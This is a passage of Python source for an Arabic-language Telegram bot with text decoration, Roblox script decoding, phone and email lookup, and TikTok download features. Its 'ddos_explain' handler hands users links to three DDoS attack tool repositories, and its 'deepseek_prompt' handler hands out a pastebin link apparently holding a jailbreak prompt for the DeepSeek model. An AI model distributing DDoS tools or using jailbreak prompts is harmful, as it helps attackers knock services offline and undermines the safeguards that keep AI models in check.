        await update.message.reply_text(info_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))

    except requests.exceptions.RequestException as e:
        await update.message.reply_text(f"حدث خطأ أثناء جلب معلومات حساب روبلوكس: {e} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ غير متوقع: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def decorate_text(update: Update, context) -> int:
    text_to_decorate = update.message.text
    if not text_to_decorate:
        await update.message.reply_text("الرجاء إرسال النص الذي تريد زخرفته. ✨", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_DECORATE_TEXT

    decorated_options = [
        f"«{text_to_decorate}»", f"『{text_to_decorate}』", f"【{text_to_decorate}】",
        f"⦅{text_to_decorate}⦆", f"〘{text_to_decorate}〙", f"〚{text_to_decorate}〛",
        f"❨{text_to_decorate}❩", f"❪{text_to_decorate}❫", f"❬{text_to_decorate}❭",
        f"❰{text_to_decorate}❱", f"❲{text_to_decorate}❳", f"❴{text_to_decorate}❵",
        f"⟅{text_to_decorate}⟆", f"⟪{text_to_decorate}⟫", f"⟬{text_to_decorate}⟭",
        f"⟮{text_to_decorate}⟯", f"⦃{text_to_decorate}⦄", f"⦅{text_to_decorate}⦆",
        f"⦗{text_to_decorate}⦘", f"⦘{text_to_decorate}⦗", f"⦙{text_to_decorate}⦙",
        f"⦚{text_to_decorate}⦚", f"⦛{text_to_decorate}⦜", f"⦝{text_to_decorate}⦞",
        f"⦟{text_to_decorate}⦠", f"⦡{text_to_decorate}⦢", f"⦣{text_to_decorate}⦤",
        f"⦥{text_to_decorate}⦦", f"⦧{text_to_decorate}⦨", f"⦩{text_to_decorate}⦪"
    ]

    response_text = "اختر الزخرفة المفضلة لديك:\n\n"
    for i, option in enumerate(decorated_options):
        response_text += f"{i+1}. {option}\n"

    await update.message.reply_text(response_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def decrypt_roblox_script(update: Update, context) -> int:
    if update.message.document:
        file_id = update.message.document.file_id
        new_file = await context.bot.get_file(file_id)
        file_path = f"./{update.message.document.file_name}"
        await new_file.download_to_drive(file_path)

        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                encrypted_content = f.read()

            try:
                decoded_content = base64.b64decode(encrypted_content).decode('utf-8')
                decrypted_text = "--تم فك بواسطه بوت 7X 😈\n" + decoded_content
            except Exception:
                decrypted_text = "--تم فك بواسطه بوت 7X 😈\n" + "لم يتم التعرف على التشفير أو فكه. قد يكون التشفير أقوى من المتوقع أو غير مدعوم حالياً.\n" + encrypted_content

            output_file_name = f"decrypted_{update.message.document.file_name}"
            with open(output_file_name, "w", encoding="utf-8") as f:
                f.write(decrypted_text)

            await update.message.reply_document(document=open(output_file_name, 'rb'), filename=output_file_name, caption="تم فك تشفير السكربت بنجاح (إذا كان التشفير مدعوماً). 🔓", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))

        except Exception as e:
            await update.message.reply_text(f"حدث خطأ أثناء معالجة الملف: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    else:
        await update.message.reply_text("الرجاء إرسال ملف السكربت المشفر. 📄", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def analyze_phone_number(update: Update, context) -> int:
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "📱 الرجاء إرسال رقم الهاتف للتحليل (مع رمز الدولة، مثال: +966501234567):",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
    )
    return GETTING_PHONE_NUMBER

async def analyze_email(update: Update, context) -> int:
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "📧 الرجاء إرسال البريد الإلكتروني للتحليل (مثال: example@gmail.com):",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
    )
    return GETTING_EMAIL_ADDRESS

async def get_phone_analysis(update: Update, context) -> int:
    phone_number = update.message.text.strip()
    
    if not phone_number:
        await update.message.reply_text(
            "❌ الرجاء إرسال رقم هاتف صحيح.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )
        return GETTING_PHONE_NUMBER
    
    try:
        if NUMVERIFY_API_KEY != "YOUR_API_KEY":
            response = requests.get(
                f"https://apilayer.net/api/validate",
                params={
                    'access_key': NUMVERIFY_API_KEY,
                    'number': phone_number,
                    'format': 1
                }
            )
            response.raise_for_status()
            data = response.json()
            
            if data.get('valid'):
                result = f"""
📱 **تحليل رقم الهاتف**

📞 الرقم: `{data.get('number', 'غير معروف')}`
🌍 الدولة: {data.get('country_name', 'غير معروف')}
🔢 رمز الدولة: +{data.get('country_code', 'غير معروف')}
📍 الموقع: {data.get('location', 'غير معروف')}
📶 النوع: {data.get('line_type', 'غير معروف')}
📡 الشركة: {data.get('carrier', 'غير معروف')}
✅ صحة الرقم: {'صحيح ✅' if data.get('valid') else 'غير صحيح ❌'}
"""
            else:
                result = f"""
❌ **تحليل رقم الهاتف**

📞 الرقم: `{phone_number}`
✅ صحة الرقم: غير صحيح ❌
"""
            
            await update.message.reply_text(result, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        
        else:
            clean_number = re.sub(r'[^\d+]', '', phone_number)
            is_valid = len(clean_number) >= 7 and len(clean_number) <= 15
            
            result = f"""
📱 **تحليل رقم الهاتف** (تحليل أساسي - مجاني)

📞 الرقم: `{clean_number}`
✅ صحة الرقم: {'صحيح ✅' if is_valid else 'غير صحيح ❌'}

⚠️ للحصول على تحليل دقيق، احصل على مفتاح API مجاني من apilayer.com
"""
            
            await update.message.reply_text(result, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
            
    except requests.exceptions.RequestException as e:
        await update.message.reply_text(
            f"❌ حدث خطأ أثناء الاتصال بـ API: {e}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )
    except Exception as e:
        await update.message.reply_text(
            f"⚠️ حدث خطأ غير متوقع: {e}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )
    return CHOOSING_MAIN_MENU

async def get_email_analysis(update: Update, context) -> int:
    email = update.message.text.strip()
    
    if not email or '@' not in email:
        await update.message.reply_text(
            "❌ الرجاء إرسال بريد إلكتروني صحيح.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )
        return GETTING_EMAIL_ADDRESS
    
    try:
        local_part, domain = email.split('@')
        
        is_valid = False
        domain_status = "غير معروف"
        disposable = False
        email_provider = "غير معروف"
        
        providers = {
            'gmail.com': 'Google Gmail', 'yahoo.com': 'Yahoo Mail', 'outlook.com': 'Microsoft Outlook',
            'hotmail.com': 'Microsoft Hotmail', 'icloud.com': 'Apple iCloud', 'protonmail.com': 'ProtonMail'
        }
        
        disposable_domains = [
            'tempmail.com', '10minutemail.com', 'guerrillamail.com', 'mailinator.com',
            'trashmail.com', 'throwawayemail.com', 'temp-mail.org', 'getnada.com'
        ]
        
        if domain in disposable_domains:
            disposable = True
        
        if domain in providers:
            email_provider = providers[domain]
        
        try:
            import dns.resolver
            mx_records = dns.resolver.resolve(domain, 'MX')
            if mx_records:
                is_valid = True
                domain_status = "نشط ✅"
            else:
                domain_status = "غير نشط ❌"
        except:
            domain_status = "تعذر التحقق ⚠️"
            if '.' in domain and len(domain) > 3:
                is_valid = True
        
        result = f"""
📧 **تحليل البريد الإلكتروني**

📌 البريد: `{email}`
✅ صحة الإيميل: {'صحيح ✔️' if is_valid else 'غير صحيح ❌'}
📡 مزود البريد: {email_provider}
🗑️ بريد مؤقت: {'نعم 🗑️' if disposable else 'لا ✅'}
🌐 حالة الدومين: {domain_status}
"""
        
        await update.message.reply_text(result, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        
    except Exception as e:
        await update.message.reply_text(
            f"⚠️ حدث خطأ أثناء تحليل البريد الإلكتروني: {e}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )
    return CHOOSING_MAIN_MENU

async def ddos_explain(update: Update, context) -> None:
    query = update.callback_query
    await query.answer()
    
    text = """
🛠️ **شرح أدوات DDOS (لأغراض تعليمية فقط)**

---

**🛠️ 1. MHDDoS**
رابط: https://github.com/MatrixTM/MHDDoS

**🛠️ 2. Typhon**
رابط: https://github.com/G0odKid/Typhon

**🛠️ 3. ddos_tool_2025**
رابط: https://github.com/infocyn/ddos-2025

---

⚠️ **تنويه:** استخدام هذه الأدوات على أطراف ثالثة دون إذن يُعتبر جريمة إلكترونية. المسؤولية القانونية والأخلاقية تقع عليك بالكامل.
"""
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
    )

async def deepseek_prompt(update: Update, context) -> None:
    query = update.callback_query
    await query.answer()
    
    text = """
😈 **برومبت ديبسيك**

انسخ هذا الرابط وأعطه لـ DeepSeek واستمتع!

🔗 https://pastefy.app/EM31V8rs/raw

⚠️ إخلاء مسؤولية: أنا أخلّي مسؤوليتي عن أي استخدام خاطئ.
"""
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
    )

async def cancel(update: Update, context) -> int:
    await update.message.reply_text(
        "تم إلغاء العملية. يمكنك البدء من جديد باستخدام /start.", reply_markup=main_menu_reply_markup
    )
    return ConversationHandler.END

def main() -> None:
    application = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSING_MAIN_MENU: [
                CallbackQueryHandler(button, pattern='^(?!main_menu$).*'),
                CallbackQueryHandler(main_menu, pattern='^main_menu$')
            ],
            GETTING_WEBSITE_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_website_html)],
            GETTING_IP_INFO_QUERY: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_ip_info)],
            GETTING_TELEGRAM_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, search_telegram_user)],
            GETTING_ROBLOX_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_roblox_account_info)],
            GETTING_DECORATE_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, decorate_text)],
            GETTING_DECRYPT_ROBLOX_SCRIPT: [MessageHandler(filters.Document.ALL, decrypt_roblox_script)],
            GETTING_CHECK_LINK_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_link)],
            GETTING_PHONE_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone_analysis)],
            GETTING_EMAIL_ADDRESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_email_analysis)],
            GETTING_TEXT_TO_TRANSLATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_translation)],
        },
        fallbacks=[CommandHandler("cancel", cancel), CallbackQueryHandler(main_menu, pattern='^main_menu$')],
        per_message=False
    )

    application.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND & filters.Regex(r'https?://(?:www\.|vm\.|vt\.)?tiktok\.com/[^\s]+'),
        handle_tiktok_download
    ))
    
    application.add_handler(conv_handler)
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
